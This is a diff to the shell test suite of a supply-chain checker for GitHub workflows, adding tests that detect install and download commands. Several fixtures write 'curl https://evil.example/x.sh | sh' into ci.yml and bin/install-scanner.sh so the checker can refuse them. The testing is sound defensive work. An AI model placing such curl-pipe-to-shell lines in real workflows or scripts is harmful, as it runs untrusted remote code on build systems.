@@ -255,7 +255,7 @@ liveproof() { # <state or ->  <run event>  <label>  -> prints the live_proofs li
   local state=$1 event=$2 label=${3:-v4.1.0}
   python3 - "$work/map.json" "$state" "$event" "$SHA1" "$(d 8)" <<'PY'
 import base64, io, json, sys, zipfile
-m = {"repos/o/act/git/matching-refs/tags?per_page=100": [{"ref": "refs/tags/v4", "object": {"type": "commit", "sha": sys.argv[4]}}, {"ref": "refs/tags/v4.1.0", "object": {"type": "commit", "sha": sys.argv[4]}}]}
+m = {}
 if sys.argv[2] != "-":
     b = io.BytesIO(); z = zipfile.ZipFile(b, "w"); z.writestr("state.json", sys.argv[2]); z.close()
     m["repos/o/r/actions/workflows/supply-chain.yml/runs?event=schedule&branch=main&status=success&per_page=100"] = {"workflow_runs": [{"id": 7, "event": sys.argv[3], "head_branch": "main", "conclusion": "success", "path": ".github/workflows/supply-chain.yml", "created_at": sys.argv[5]}]}
@@ -271,6 +271,7 @@ def run(cmd, *a, **k):
     if cmd and cmd[0] == "gh": cmd = [sys.argv[3], *cmd[1:]]
     return orig(cmd, *a, **k)
 subprocess.run = run
+ac._tag_refs = lambda repo: {"v4": sys.argv[2], "v4.1.0": sys.argv[2]}
 try:
     print(ac.live_proofs(ac.inv.Item("action", "o/act", sys.argv[2], sys.argv[4]), "."))
 except ac.CouldNotLook as e:
@@ -395,7 +396,7 @@ check python3 - "$here/../bin/pin-inventory.py" <<'PY'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
 f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
-whats = {w for _, w in inv.unmeasured(f)}
+whats = {k[1] for k in inv.unmeasured(f)}
 assert whats == {"a package-manager install", "an apt install", "a gh release download", "a pip install from a URL", "a download from a non-release URL"}, whats
 PY
 
@@ -435,6 +436,49 @@ CASE="an unmeasured form already in the base (count unchanged by the head) is no
 rc=0; python3 "$chk" --root "$work/unm3" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/unm3.out" 2>&1 || rc=$?
 check test "$rc" -eq 0
 
+CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
+check python3 - "$chk" <<'PY'
+import importlib.util, subprocess, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+calls = []
+def run(cmd, **k):
+    calls.append(cmd)
+    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
+    return subprocess.CompletedProcess(cmd, 0, out, "")
+subprocess.run = run
+assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
+assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
+ac._TAGS.clear()
+subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
+try:
+    ac._tags_for_commit("o/r", "c1")
+except ac.CouldNotLook:
+    pass
+else:
+    raise AssertionError("a failed ls-remote was read as no tags")
+PY
+rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
+python3 - "$work/swap2" <<'PY'
+import pathlib, subprocess, sys
+root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
+f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
+g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
+g("add", "-A"); g("commit", "-q", "-m", "base2")
+f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
+g("add", "-A"); g("commit", "-q", "-m", "head")
+PY
+runck swap2 '{"times": {}}'
+CASE="an in-place SWAP of one unmeasured command for another (localhost curl -> evil download) is an addition: refused, though the count did not change"
+check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/swap2.out"
+newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
+runck cont '{"times": {}}'
+CASE="continuation lines, apt-get -y install and npm -g install are all recognised as unmeasured forms and refused"
+check test "$rc" -eq 1; check grep -q 'a download from a non-release URL' "$work/cont.out"; check grep -q 'an apt install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
+newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
+runck scanner '{"times": {}}'
+CASE="a download appended to bin/install-scanner.sh is refused too (the file is read for unmeasured forms as well as its *_VER pins)"
+check test "$rc" -eq 1; check grep -q 'unmeasured:bin/install-scanner.sh' "$work/scanner.out"
+
 # --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
 mkdir -p "$work/stubbin"
 cat >"$work/stubbin/gh" <<'STUB'
@@ -446,7 +490,7 @@ esac
 exit 1
 STUB
 chmod +x "$work/stubbin/gh"
-newcase livea "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
+newcase livea "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')"
 live() { rc=0; ( cd "$work" && env -u GITHUB_REPOSITORY GH_MODE="$1" PATH="$work/stubbin:$PATH" python3 "$chk" --root "$work/livea" --base HEAD~1 --head HEAD --now "$NOW" ) >"$work/live.out" 2>&1 || rc=$?; }
 live ratelimit
 CASE="live: GitHub's rate limit is 'could not look': exit 2, says so and is not a pass"
